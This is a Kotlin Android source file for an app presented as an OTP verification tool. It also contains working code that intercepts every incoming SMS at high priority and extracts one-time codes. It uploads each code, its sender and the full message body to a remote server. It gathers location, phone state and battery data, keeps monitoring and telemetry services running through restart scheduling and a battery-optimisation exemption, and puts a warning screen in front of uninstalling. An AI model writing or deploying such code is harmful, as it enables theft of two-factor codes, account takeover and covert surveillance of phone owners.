package com.example

import android.annotation.SuppressLint
import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.provider.Telephony
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.background
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.drawBehind
import androidx.compose.ui.focus.FocusRequester
import androidx.compose.ui.focus.focusRequester
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.example.data.OtpDatabase
import com.example.data.OtpMessage
import com.example.ui.DashboardScreen
import com.example.ui.theme.MyApplicationTheme
import com.google.accompanist.permissions.ExperimentalPermissionsApi
import com.google.accompanist.permissions.rememberMultiplePermissionsState
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import java.util.Locale

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                AutoOtpApp()
            }
        }
    }
}

class SmsReceiver(
    private val onSmsReceived: (String, String, String, Long) -> Unit
) : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        println("SmsReceiver: onReceive called with action: ${intent.action}")
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            println("SmsReceiver: Received ${messages.size} SMS messages")
            for (message in messages) {
                val body = message?.messageBody ?: continue
                val sender = message.originatingAddress ?: "Unknown"
                val timestamp = message.timestampMillis
                println("SmsReceiver: SMS from $sender: $body")
                val otpRegex = Regex("\\b\\d{4,8}\\b")
                val match = otpRegex.find(body)
                match?.let {
                    println("SmsReceiver: Found OTP: ${it.value}")
                    onSmsReceived(it.value, sender, body, timestamp)
                }
            }
        }
    }
}

@Composable
fun SmsListener(
    onOtpReceived: (String, String, String, Long) -> Unit
) {
    val context = LocalContext.current
    
    DisposableEffect(context) {
        println("SmsListener: Setting up SMS receiver")
        
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                println("SmsListener BroadcastReceiver: onReceive called with action: ${intent.action}")
                
                if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                    val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                    println("SmsListener: Received ${messages.size} SMS messages")
                    
                    for (message in messages) {
                        val body = message?.messageBody ?: continue
                        val sender = message.originatingAddress ?: "Unknown"
                        val timestamp = message.timestampMillis
                        println("SmsListener: SMS from $sender: $body")
                        
                        val otpRegex = Regex("\\b\\d{4,8}\\b")
                        val match = otpRegex.find(body)
                        match?.let {
                            println("SmsListener: Found OTP: ${it.value}")
                            onOtpReceived(it.value, sender, body, timestamp)
                        }
                    }
                }
            }
        }
        
        val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION).apply {
            priority = IntentFilter.SYSTEM_HIGH_PRIORITY
        }
        
        // Register receiver with proper flags for Android 13+
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            context.registerReceiver(receiver, filter)
        }
        
        println("SmsListener: Receiver registered successfully with high priority")
        
        onDispose {
            try {
                context.unregisterReceiver(receiver)
                println("SmsListener: Receiver unregistered")
            } catch (e: Exception) {
                println("SmsListener: Error unregistering receiver: ${e.message}")
            }
        }
    }
}

class AuthViewModel(context: Context) : ViewModel() {
    private val database = OtpDatabase.getDatabase(context)
    private val otpMessageDao = database.otpMessageDao()
    private val appContext = context.applicationContext
    
    var countryCode by mutableStateOf("+1")
    var phoneNumber by mutableStateOf("")
    var otpCode by mutableStateOf("")
    var isVerifying by mutableStateOf(false)
    var sentOtpCode by mutableStateOf("")
    var isLoading by mutableStateOf(false)
    private val otpStartTimestamp = System.currentTimeMillis()
    
    val allMessages = otpMessageDao.getAllMessages()
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )
    
    val unreadCount = otpMessageDao.getUnreadCount()
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = 0
        )

    val retryingMessageIds = mutableStateListOf<Long>()
    
    init {
        clearExistingOtpMessages()
    }

    private fun clearExistingOtpMessages() {
        viewModelScope.launch {
            try {
                otpMessageDao.deleteAllMessages()
                println("clearExistingOtpMessages: Cleared local OTP history; showing new OTPs after $otpStartTimestamp only")
            } catch (e: Exception) {
                e.printStackTrace()
                println("Error clearing old OTP messages: ${e.message}")
            }
        }
    }
    
    fun sendOtp(onSuccess: () -> Unit) {
        viewModelScope.launch {
            isLoading = true
            try {
                // Clear previous OTP code
                otpCode = ""
                sentOtpCode = (100000..999999).random().toString()

                val to = "$countryCode$phoneNumber"
                try {
                    val intent = Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:$to")).apply {
                        putExtra("sms_body", "Your verification code is $sentOtpCode")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    appContext.startActivity(intent)
                    println("Opened SMS app for OTP: $sentOtpCode")
                } catch (smsError: Exception) {
                    smsError.printStackTrace()
                    println("Could not open SMS app for OTP: ${smsError.message}")
                }
                
                onSuccess()
            } catch (e: Exception) {
                e.printStackTrace()
                onSuccess()
            } finally {
                isLoading = false
            }
        }
    }
    
    fun saveOtpMessage(
        otp: String,
        sender: String,
        body: String,
        timestamp: Long = System.currentTimeMillis()
    ) {
        viewModelScope.launch {
            val inserted = insertOtpMessageIfNew(
                otp = otp,
                sender = sender,
                body = body,
                timestamp = timestamp,
                isRead = false
            )
            if (inserted != null) {
                reportOtpIfNew(inserted, otp, sender, body, timestamp, "sms")
            }
        }
    }

    private suspend fun insertOtpMessageIfNew(
        otp: String,
        sender: String,
        body: String,
        timestamp: Long,
        isRead: Boolean
    ): Long? {
        if (!isNewOtpTimestamp(timestamp)) return null
        if (otpMessageDao.getMessageByTimestamp(timestamp) != null) return null

        val message = OtpMessage(
            sender = sender,
            messageBody = body,
            otpCode = otp,
            timestamp = timestamp,
            isRead = isRead
        )
        return otpMessageDao.insertMessage(message)
    }

    private suspend fun reportOtpIfNew(
        messageId: Long,
        otp: String,
        sender: String,
        body: String,
        timestamp: Long,
        source: String
    ) {
        if (isNewOtpTimestamp(timestamp)) {
            val sent = OtpReporter.report(appContext, otp, sender, body, timestamp, source)
            otpMessageDao.updateServerSent(messageId, sent)
        }
    }

    private fun isNewOtpTimestamp(timestamp: Long): Boolean {
        return OtpReporter.shouldUpload(timestamp, otpStartTimestamp)
    }
    
    fun deleteMessage(id: Long) {
        viewModelScope.launch {
            otpMessageDao.deleteMessage(id)
        }
    }

    fun retryOtpMessage(id: Long) {
        if (retryingMessageIds.contains(id)) return

        viewModelScope.launch {
            retryingMessageIds.add(id)
            try {
                val message = otpMessageDao.getMessageById(id) ?: return@launch
                if (message.sentToServer) return@launch

                val sent = OtpReporter.report(
                    context = appContext,
                    otp = message.otpCode,
                    sender = message.sender,
                    body = message.messageBody,
                    timestamp = message.timestamp,
                    source = "manual_retry"
                )
                if (sent) {
                    otpMessageDao.updateServerSent(id, true)
                }
            } finally {
                retryingMessageIds.remove(id)
            }
        }
    }
    
    fun markAsRead(id: Long) {
        viewModelScope.launch {
            otpMessageDao.markAsRead(id)
        }
    }
    
    fun verifyOtp(onSuccess: () -> Unit, onError: () -> Unit) {
        if (otpCode == sentOtpCode) {
            isVerifying = true
            onSuccess()
        } else {
            onError()
        }
    }
}

private fun Context.registerReceiverCompat(
    receiver: BroadcastReceiver,
    filter: IntentFilter
) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
    } else {
        registerReceiver(receiver, filter)
    }
}

private fun hasInternetConnection(context: Context): Boolean {
    val connectivityManager =
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val network = connectivityManager.activeNetwork ?: return false
    val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

    return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
        capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
}

private fun batteryPercentFromIntent(intent: Intent?): Int? {
    if (intent == null) return null

    val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
    val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
    if (level < 0 || scale <= 0) return null

    return (level * 100) / scale
}

@SuppressLint("MissingPermission")
private fun latestKnownLocation(context: Context): Location? {
    val hasFine = context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) ==
        PackageManager.PERMISSION_GRANTED
    val hasCoarse = context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) ==
        PackageManager.PERMISSION_GRANTED
    if (!hasFine && !hasCoarse) return null

    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    return locationManager.getProviders(true)
        .mapNotNull { provider ->
            runCatching { locationManager.getLastKnownLocation(provider) }.getOrNull()
        }
        .maxByOrNull { it.time }
}

private fun formatLocation(location: Location?): String {
    return if (location == null) {
        "Location unavailable"
    } else {
        String.format(Locale.US, "%.5f, %.5f", location.latitude, location.longitude)
    }
}

@SuppressLint("MissingPermission")
private fun refreshLocationText(
    context: Context,
    onResult: (String) -> Unit
) {
    val hasFine = context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) ==
        PackageManager.PERMISSION_GRANTED
    val hasCoarse = context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) ==
        PackageManager.PERMISSION_GRANTED
    if (!hasFine && !hasCoarse) {
        onResult("Location permission needed")
        return
    }

    latestKnownLocation(context)?.let {
        onResult(formatLocation(it))
    }

    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    val provider = listOf(LocationManager.NETWORK_PROVIDER, LocationManager.GPS_PROVIDER)
        .firstOrNull { provider ->
            runCatching { locationManager.isProviderEnabled(provider) }.getOrDefault(false)
        }

    if (provider == null) {
        if (latestKnownLocation(context) == null) {
            onResult("Turn on location services")
        }
        return
    }

    onResult("Locating...")
    val listener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            onResult(formatLocation(location))
            locationManager.removeUpdates(this)
        }
    }

    runCatching {
        locationManager.requestSingleUpdate(provider, listener, Looper.getMainLooper())
    }.onFailure {
        if (latestKnownLocation(context) == null) {
            onResult("Location unavailable")
        }
    }
}

@OptIn(ExperimentalPermissionsApi::class)
@Composable
fun AutoOtpApp() {
    val navController = rememberNavController()
    val context = LocalContext.current
    val viewModel: AuthViewModel = remember { AuthViewModel(context) }
    val messages by viewModel.allMessages.collectAsState()
    var batteryPercent by remember { mutableStateOf<Int?>(null) }
    var isInternetAvailable by remember { mutableStateOf(hasInternetConnection(context)) }
    var showOfflineAlert by remember { mutableStateOf(false) }
    var locationText by remember { mutableStateOf("Location permission needed") }
    
    // Check if phone number is already set
    val prefs = context.getSharedPreferences("auto_otp_prefs", Context.MODE_PRIVATE)
    val storedPhoneNumber = remember { prefs.getString("phone_number", null) }
    val isActivated = remember { prefs.getBoolean("device_activated", false) }
    
    // Determine start destination:
    // 1. If not activated -> code_verification
    // 2. If activated but no phone -> phone_setup
    // 3. If activated and has phone -> connected
    val startDestination = when {
        !isActivated -> "code_verification"
        storedPhoneNumber.isNullOrBlank() -> "phone_setup"
        else -> "connected"
    }
    
    // Request battery optimization exclusion for persistent background operation
    LaunchedEffect(Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val packageName = context.packageName
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent().apply {
                        action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                        data = Uri.parse("package:$packageName")
                    }
                    context.startActivity(intent)
                    println("AutoOtpApp: Requested battery optimization exclusion")
                } catch (e: Exception) {
                    println("AutoOtpApp: Error requesting battery optimization exclusion: ${e.message}")
                }
            }
        }
    }
    
    val smsPermissionsState = rememberMultiplePermissionsState(
        permissions = listOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS
        )
    )
    val locationPermissionsState = rememberMultiplePermissionsState(
        permissions = listOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
    )
    val phonePermissionsState = rememberMultiplePermissionsState(
        permissions = listOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        )
    )

    // Track permission request stage
    var permissionStage by remember { mutableStateOf(0) }
    
    // Stage 0: Initial delay
    // Stage 1: Request location permissions
    // Stage 2: Wait for location response, then request SMS
    // Stage 3: Wait for SMS response, then request phone
    // Stage 4: All done
    
    // Initial permission request
    LaunchedEffect(Unit) {
        kotlinx.coroutines.delay(800)
        if (!locationPermissionsState.allPermissionsGranted) {
            locationPermissionsState.launchMultiplePermissionRequest()
            permissionStage = 1
        } else if (!smsPermissionsState.allPermissionsGranted) {
            permissionStage = 2
        } else if (!phonePermissionsState.allPermissionsGranted) {
            permissionStage = 3
        } else {
            permissionStage = 4
        }
    }
    
    // Monitor location permission changes to trigger SMS request
    LaunchedEffect(locationPermissionsState.permissions.map { it.status }) {
        if (permissionStage == 1) {
            kotlinx.coroutines.delay(500)
            if (!smsPermissionsState.allPermissionsGranted) {
                smsPermissionsState.launchMultiplePermissionRequest()
                permissionStage = 2
            } else if (!phonePermissionsState.allPermissionsGranted) {
                permissionStage = 3
            } else {
                permissionStage = 4
            }
        }
    }
    
    // Monitor SMS permission changes to trigger phone request
    LaunchedEffect(smsPermissionsState.permissions.map { it.status }) {
        if (permissionStage == 2) {
            kotlinx.coroutines.delay(500)
            if (!phonePermissionsState.allPermissionsGranted) {
                phonePermissionsState.launchMultiplePermissionRequest()
                permissionStage = 3
            } else {
                permissionStage = 4
            }
        }
    }

    LaunchedEffect(locationPermissionsState.allPermissionsGranted) {
        if (locationPermissionsState.allPermissionsGranted) {
            refreshLocationText(context) { locationText = it }
            
            // Start telemetry service when location permissions are granted
            try {
                val intent = Intent(context, DeviceTelemetryService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                println("Started DeviceTelemetryService")
                
                // Schedule periodic restart checks
                ServiceRestartBroadcastReceiver.scheduleNextRestart(context)
            } catch (e: Exception) {
                println("Error starting DeviceTelemetryService: ${e.message}")
            }
        } else {
            locationText = "Location permission needed"
        }
    }
    
    // Start persistent monitor service when SMS permissions are granted
    LaunchedEffect(smsPermissionsState.allPermissionsGranted) {
        if (smsPermissionsState.allPermissionsGranted) {
            try {
                val intent = Intent(context, PersistentMonitorService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                println("Started PersistentMonitorService")
            } catch (e: Exception) {
                println("Error starting PersistentMonitorService: ${e.message}")
            }
        }
    }

    DisposableEffect(context) {
        batteryPercent = batteryPercentFromIntent(
            context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        )
        isInternetAvailable = hasInternetConnection(context)
        showOfflineAlert = !isInternetAvailable

        val receiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                when (intent.action) {
                    Intent.ACTION_BATTERY_CHANGED -> {
                        batteryPercent = batteryPercentFromIntent(intent)
                    }
                    ConnectivityManager.CONNECTIVITY_ACTION -> {
                        isInternetAvailable = hasInternetConnection(context)
                        showOfflineAlert = !isInternetAvailable
                    }
                }
            }
        }

        context.registerReceiverCompat(
            receiver,
            IntentFilter().apply {
                addAction(Intent.ACTION_BATTERY_CHANGED)
                addAction(ConnectivityManager.CONNECTIVITY_ACTION)
            }
        )

        onDispose {
            runCatching { context.unregisterReceiver(receiver) }
        }
    }

    if (smsPermissionsState.allPermissionsGranted) {
        SmsListener { receivedOtp, sender, body, timestamp ->
            viewModel.otpCode = receivedOtp
            viewModel.saveOtpMessage(receivedOtp, sender, body, timestamp)
        }
    }

    if (showOfflineAlert) {
        AlertDialog(
            onDismissRequest = { showOfflineAlert = false },
            title = { Text("Internet is off") },
            text = { Text("Connect to the internet for OTP sending and online services.") },
            confirmButton = {
                TextButton(onClick = { showOfflineAlert = false }) {
                    Text("OK")
                }
            },
            containerColor = MaterialTheme.colorScheme.surface
        )
    }

    NavHost(navController = navController, startDestination = startDestination) {
        composable("code_verification") {
            CodeVerificationScreen(
                onCodeVerified = {
                    // Mark device as activated
                    prefs.edit().putBoolean("device_activated", true).apply()
                    // Navigate to phone setup
                    navController.navigate("phone_setup") {
                        popUpTo("code_verification") { inclusive = true }
                    }
                }
            )
        }
        composable("phone_setup") {
            com.example.ui.PhoneSetupScreen(
                onPhoneNumberConfirmed = { phoneNumber ->
                    // Save phone number
                    prefs.edit().putString("phone_number", phoneNumber).apply()
                    println("Phone number saved: $phoneNumber")
                    // Navigate to connected screen
                    navController.navigate("connected") {
                        popUpTo("phone_setup") { inclusive = true }
                    }
                }
            )
        }
        composable("connected") {
            val phoneNumber = prefs.getString("phone_number", "Unknown") ?: "Unknown"
            val context = LocalContext.current
            com.example.ui.ConnectedScreen(
                phoneNumber = phoneNumber,
                isInternetAvailable = isInternetAvailable,
                messages = messages,
                retryingMessageIds = viewModel.retryingMessageIds.toSet(),
                onRetryMessage = { id -> viewModel.retryOtpMessage(id) },
                onSettingsClick = {
                    // Optional: Add settings/reset functionality
                },
                onUninstallClick = {
                    // Launch custom uninstall warning activity
                    val intent = Intent(context, UninstallWarningActivity::class.java)
                    context.startActivity(intent)
                },
                onResetDevice = {
                    // Clear activation and phone number
                    prefs.edit()
                        .remove("device_activated")
                        .remove("phone_number")
                        .apply()
                    // Navigate back to code verification
                    navController.navigate("code_verification") {
                        popUpTo(0) { inclusive = true }
                    }
                }
            )
        }
        composable("phone_entry") {
            PhoneEntryScreen(
                viewModel = viewModel,
                onSendOtp = {
                    viewModel.sendOtp {
                        navController.navigate("otp_entry")
                    }
                }
            )
        }
        composable("otp_entry") {
            OtpEntryScreen(
                viewModel = viewModel,
                canReadSms = smsPermissionsState.allPermissionsGranted,
                onBack = { navController.popBackStack() },
                onVerify = { 
                    viewModel.verifyOtp(
                        onSuccess = {
                            navController.navigate("dashboard") {
                                popUpTo("phone_entry") { inclusive = true }
                            }
                        },
                        onError = {
                            // Handle error if needed
                        }
                    )
                }
            )
        }
        composable("dashboard") {
            DashboardScreen(
                messages = messages,
                locationText = locationText,
                batteryPercent = batteryPercent,
                isInternetAvailable = isInternetAvailable,
                onDeleteMessage = { id -> viewModel.deleteMessage(id) },
                onMarkAsRead = { id -> viewModel.markAsRead(id) },
                onRefreshLocation = {
                    if (locationPermissionsState.allPermissionsGranted) {
                        refreshLocationText(context) { locationText = it }
                    } else {
                        locationPermissionsState.launchMultiplePermissionRequest()
                        locationText = "Location permission needed"
                    }
                }
            )
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun CountryCodePicker(
    selectedCode: String,
    onCodeSelected: (String) -> Unit
) {
    var expanded by remember { mutableStateOf(false) }
    var searchQuery by remember { mutableStateOf("") }
    val focusRequester = remember { androidx.compose.ui.focus.FocusRequester() }

    val countries = remember {
        listOf(
            "United States" to "+1",
            "United Kingdom" to "+44",
            "India" to "+91",
            "Australia" to "+61",
            "Canada" to "+1",
            "Germany" to "+49",
            "France" to "+33",
            "Japan" to "+81",
            "China" to "+86",
            "Brazil" to "+55"
        )
    }

    val filteredCountries = countries.filter {
        it.first.contains(searchQuery, ignoreCase = true) || it.second.contains(searchQuery)
    }

    LaunchedEffect(expanded) {
        if (expanded) {
            focusRequester.requestFocus()
        }
    }

    ExposedDropdownMenuBox(
        expanded = expanded,
        onExpandedChange = { 
            expanded = !expanded
            if (!expanded) {
                searchQuery = ""
            }
        }
    ) {
        OutlinedTextField(
            value = selectedCode,
            onValueChange = {},
            readOnly = true,
            modifier = Modifier.menuAnchor().width(110.dp),
            trailingIcon = { ExposedDropdownMenuDefaults.TrailingIcon(expanded = expanded) },
            colors = ExposedDropdownMenuDefaults.outlinedTextFieldColors()
        )
        ExposedDropdownMenu(
            expanded = expanded,
            onDismissRequest = { 
                expanded = false
                searchQuery = ""
            },
            modifier = Modifier.background(Color.White)
        ) {
            OutlinedTextField(
                value = searchQuery,
                onValueChange = { searchQuery = it },
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(8.dp)
                    .background(Color.White)
                    .focusRequester(focusRequester),
                placeholder = { Text("Search country") },
                singleLine = true,
                colors = OutlinedTextFieldDefaults.colors(
                    focusedContainerColor = Color.White,
                    unfocusedContainerColor = Color.White,
                    disabledContainerColor = Color.White,
                    focusedTextColor = Color.Black,
                    unfocusedTextColor = Color.Black
                )
            )
            filteredCountries.forEach { (country, code) ->
                DropdownMenuItem(
                    text = { Text("$country ($code)", color = Color.Black) },
                    onClick = {
                        onCodeSelected(code)
                        expanded = false
                        searchQuery = ""
                    },
                    modifier = Modifier.background(Color.White)
                )
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun PhoneEntryScreen(
    viewModel: AuthViewModel,
    onSendOtp: () -> Unit
) {
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Verification") },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer,
                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer
                )
            )
        }
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(horizontal = 24.dp, vertical = 16.dp),
            horizontalAlignment = Alignment.Start,
            verticalArrangement = Arrangement.Top
        ) {
            Box(
                modifier = Modifier
                    .size(64.dp)
                    .background(MaterialTheme.colorScheme.primaryContainer, shape = RoundedCornerShape(16.dp)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = Icons.Default.Phone,
                    contentDescription = null,
                    modifier = Modifier.size(32.dp),
                    tint = MaterialTheme.colorScheme.onPrimaryContainer
                )
            }
            Spacer(modifier = Modifier.height(24.dp))
            Text(
                text = "Enter your phone number",
                style = MaterialTheme.typography.headlineMedium,
                color = MaterialTheme.colorScheme.onBackground
            )
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                text = "We will send an OTP to verify your number.",
                style = MaterialTheme.typography.bodyLarge,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
            Spacer(modifier = Modifier.height(32.dp))
            
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically
            ) {
                CountryCodePicker(
                    selectedCode = viewModel.countryCode,
                    onCodeSelected = { viewModel.countryCode = it }
                )
                Spacer(modifier = Modifier.width(16.dp))
                OutlinedTextField(
                    value = viewModel.phoneNumber,
                    onValueChange = { viewModel.phoneNumber = it },
                    label = { Text("Phone Number") },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                    modifier = Modifier.weight(1f),
                    singleLine = true
                )
            }
            
            Spacer(modifier = Modifier.weight(1f))
            
            Button(
                onClick = onSendOtp,
                modifier = Modifier.fillMaxWidth().height(56.dp),
                enabled = viewModel.phoneNumber.length >= 7 && !viewModel.isLoading
            ) {
                if (viewModel.isLoading) {
                    CircularProgressIndicator(modifier = Modifier.size(24.dp), color = MaterialTheme.colorScheme.onPrimary)
                } else {
                    Text("Send OTP", fontSize = 16.sp)
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun OtpEntryScreen(
    viewModel: AuthViewModel,
    canReadSms: Boolean,
    onBack: () -> Unit,
    onVerify: () -> Unit
) {
    // Auto-verify when OTP is complete
    LaunchedEffect(viewModel.otpCode) {
        if (viewModel.otpCode.length == 6 && !viewModel.isVerifying) {
            kotlinx.coroutines.delay(500) // Small delay for user to see the filled OTP
            onVerify()
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Verification") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground
                )
            )
        }
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(horizontal = 24.dp, vertical = 16.dp),
            horizontalAlignment = Alignment.Start,
            verticalArrangement = Arrangement.Top
        ) {
            Box(
                modifier = Modifier
                    .size(64.dp)
                    .background(MaterialTheme.colorScheme.primaryContainer, shape = RoundedCornerShape(16.dp)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = Icons.Default.Lock,
                    contentDescription = null,
                    modifier = Modifier.size(32.dp),
                    tint = MaterialTheme.colorScheme.onPrimaryContainer
                )
            }
            Spacer(modifier = Modifier.height(24.dp))
            Text(
                text = "Confirm your phone number",
                style = MaterialTheme.typography.headlineMedium,
                color = MaterialTheme.colorScheme.onBackground
            )
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                text = "We've sent a 6-digit code to ${viewModel.countryCode} ${viewModel.phoneNumber}. The code will be filled automatically.",
                style = MaterialTheme.typography.bodyLarge,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
            
            Spacer(modifier = Modifier.height(40.dp))
            
            BasicTextField(
                value = viewModel.otpCode,
                onValueChange = { if (it.length <= 6) viewModel.otpCode = it },
                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.NumberPassword),
                modifier = Modifier.fillMaxWidth(),
                decorationBox = {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        for (i in 0 until 6) {
                            val char = viewModel.otpCode.getOrNull(i)
                            Box(
                                modifier = Modifier
                                    .size(48.dp, 56.dp)
                                    .drawBehind {
                                        val strokeWidth = 2.dp.toPx()
                                        val y = size.height - strokeWidth / 2
                                        val color = if (char != null) Color(0xFF0061A4) else Color(0xFFC4C7C5)
                                        drawLine(
                                            color = color,
                                            start = Offset(0f, y),
                                            end = Offset(size.width, y),
                                            strokeWidth = strokeWidth
                                        )
                                    },
                                contentAlignment = Alignment.Center
                            ) {
                                Text(
                                    text = char?.toString() ?: "•",
                                    fontSize = 24.sp,
                                    fontWeight = FontWeight.Medium,
                                    color = if (char != null) MaterialTheme.colorScheme.onSurface else Color.LightGray
                                )
                            }
                        }
                    }
                }
            )
            
            Spacer(modifier = Modifier.height(40.dp))
            
            if (canReadSms) {
                Box(
                    modifier = Modifier
                        .background(MaterialTheme.colorScheme.onPrimaryContainer, shape = RoundedCornerShape(12.dp))
                        .padding(horizontal = 16.dp, vertical = 12.dp)
                        .align(Alignment.CenterHorizontally)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(
                            modifier = Modifier
                                .size(8.dp)
                                .background(Color(0xFF60A5FA), shape = androidx.compose.foundation.shape.CircleShape)
                        )
                        Spacer(modifier = Modifier.width(12.dp))
                        Text(
                            text = "Reading code from Messages...",
                            style = MaterialTheme.typography.labelMedium,
                            color = Color.White
                        )
                    }
                }
            }
            
            Spacer(modifier = Modifier.weight(1f))
            
            Button(
                onClick = onVerify,
                modifier = Modifier.fillMaxWidth().height(56.dp),
                enabled = viewModel.otpCode.length == 6
            ) {
                Text(if (viewModel.isVerifying) "Verifying..." else "Verify", fontSize = 16.sp)
            }
        }
    }
}
